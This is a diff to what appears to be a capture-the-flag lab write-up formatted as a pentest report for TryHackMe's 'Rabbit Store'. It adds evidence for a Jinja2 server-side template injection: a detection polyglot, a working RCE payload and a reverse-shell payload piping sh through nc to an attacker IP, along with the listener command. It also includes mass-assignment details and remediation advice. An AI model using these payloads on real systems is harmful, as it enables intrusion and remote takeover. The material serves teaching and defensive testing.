@@ -20,7 +20,7 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N
 An unauthenticated attacker could manipulate JSON parameters during registration to set sensitive attributes. The exploit is network-accessible, low complexity, no privileges or user interaction required. The results are low impact within the application context, due to only one parameter being available for manipulation.  
 
 **Summary:**   
-When registering as a new user on the website, it was discovered that the JSON parameters could be modified and submitted for successful registration. This then allowed the user to log in and access the restricted subscription only portion of the website. This allows attackers to gain access to hidden functionality or information only intended for paying clients, attackers could publicly leak this information.   
+When registering as a new user on the website, it was discovered that the JSON parameters could be modified and submitted for successful registration. This then allowed the user to log in and access the restricted subscription-only portion of the website. This allows attackers to gain access to hidden functionality or information only intended for paying clients, attackers could publicly leak this information.   
 
 **Background:**   
 The `/api/register` endpoint accepted client-controlled fields that should have been controlled server-side. By supplying `"subscription":"active"` during the registration process the server returned a valid JWT with `"subscription":"active"`, enabling access to restricted functionality. This is classed as a mass assignment vulnerability issue where server-side enforcement of assignable fields is missing.  
@@ -99,21 +99,67 @@ Implement strict input validation and allow-list server-side URL fetches. Block 
 CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  
 
 **CVSS Justification:**    
-User input passed to the Jinja2 template lead to remote code execution. The attack was network-accessible, low complexity, and required prior authenticated access to the subscription-only dashboard. This resulted in high confidentiality, integrity and availability impact.  
+User input passed to the Jinja2 template led to remote code execution. The attack was network-accessible, low complexity, and required prior authenticated access to the subscription-only dashboard. This resulted in high confidentiality, integrity and availability impact.  
 
 **Summary:**   
-The `/api/fetch_messages_from_chatbot` POST endpoint which is still under development reflected user supplied inputs into the template. A crafted payload could be supplied and executed to run system commands; this succesfully allowed access to the target machine has a low privilge user.  
+The `/api/fetch_messages_from_chatbot` POST endpoint, which is still under development, reflected user-supplied inputs into the template. A crafted payload could be supplied and executed to run system commands; this successfully allowed access to the target machine as a low-privilege user.  
 
 **Background:**   
-Template rending logic included unsanitised user inputs. When supplying a user input to the `/api/fetch_messages_from_chatbot` endpoint via a HTTP POST request the output was reflected into the Jinja2 template. Using a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\` an exeption was raised in the server response providing details as to the template engine in use and the confirmation of a existing template-injection vulnerability. A specially crafted message was then sent to the endpoint to inititate a reverse shell connection which was executed succesfully and provided shell access to the target as the user `azrael`.  
+Template rendering logic included unsanitised user inputs. When supplying a user input to the `/api/fetch_messages_from_chatbot` endpoint via a HTTP POST request the output was reflected into the Jinja2 template. Using a sequence of special characters commonly used in template expressions, such as `${{<%[%'\"}}%\\` an exception was raised in the server response, revealing the template engine in use and confirming the presence of a template-injection vulnerability. A specially crafted message was then sent to the endpoint to initiate a reverse shell connection which was executed successfully and provided shell access to the target as the user `azrael`.  
 
-**Technical details & Evidence:** 
+**Technical details & Evidence:**  
+The following details the steps taken to confirm the POST request format to the `/api/fetch_messages_from_chatbot` endpoint, determine the template engine in use and gain shell access.  
 
+A POST request with an empty body was sent.  
+![SSTI - blank test.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20blank%20test.png)  
+The server responded with HTTP `200`, confirming the endpoint's availability and the request format. This also provided a helpful error message as to the minimum required parameter needed in the request body. 
+
+Next another request was sent with the username included in the body.  
+```JSON
+{
+ "username":"test"
+}
+```
+![SSTI - test username.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20username%20test.png)  
+In the response from the server the username provided of `test` is reflected in the message.  
+
+The next stage is now to generate an exception in the server response by using a polyglot. Various combinations were executed, but the one which was successful was `${{<%[%'\"}}%\\` which is a common polyglot used to identify template engines. 
+```JSON
+{
+ "username":"${{<%[%'\"}}%\\"
+}
+```
+![SSTI - polyglot.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20polyglot.png)  
+The server response this time provided details of the template engine in use and raised an exception which strongly indicates it is vulnerable to Server-Side Template Injection. Research points to public proofs-of-concept demonstrating remote code execution in vulnerable Jinja2 instances. 
+
+First, a payload was sent in the POST request to validate remote code execution and output the `id` command.  
+```JSON
+{
+ "username":"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
+}
+```
+![SSTI - Id test.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20ID%20test.png)  
+The server’s response confirmed command execution was possible, and the output indicated commands were being executed as the `azrael` user.  
+
+Now the payload was modified to attempt to gain reverse shell access to the target system.
+```JSON
+{
+ "username":"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.12.97 9001 >/tmp/f\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
+}
+```
+Prior to sending this request to the server, a listener was set up on the attacking machine.
+```bash
+nc -lnvp 9001
+```
+![SSTI - reverse shell payload.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20reverse%20shell%20payload.png)  
+This did not generate an HTTP response body; however, a reverse shell was received on the listener as the `azrael` user.   
+![SSTI - shell.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20shell.png)
 
 **Impact:**   
-
+Full remote code execution on the application host, enabling arbitrary command execution and access to sensitive data. Attackers can leverage this initial access, even if only as a low-privilege user, to pivot to other hosts on the network or escalate privileges on the target system, leading to further damage.  
 
 **Remediation Advice:**   
+Where possible, do not allow users to create or modify templates. If template submission is required by business needs, validate and sanitise all inputs strictly. Execute any user-submitted templates or code in a sandboxed environment that restricts access to dangerous modules and functions.  
 
 ---
 
@@ -136,3 +182,4 @@ Template rending logic included unsanitised user inputs. When supplying a user i
 [OWASP Top 10](https://owasp.org/www-project-top-ten/)  
 [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)  
 [CVSS 4.0](https://www.first.org/cvss/calculator/4-0)  
+[Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)  
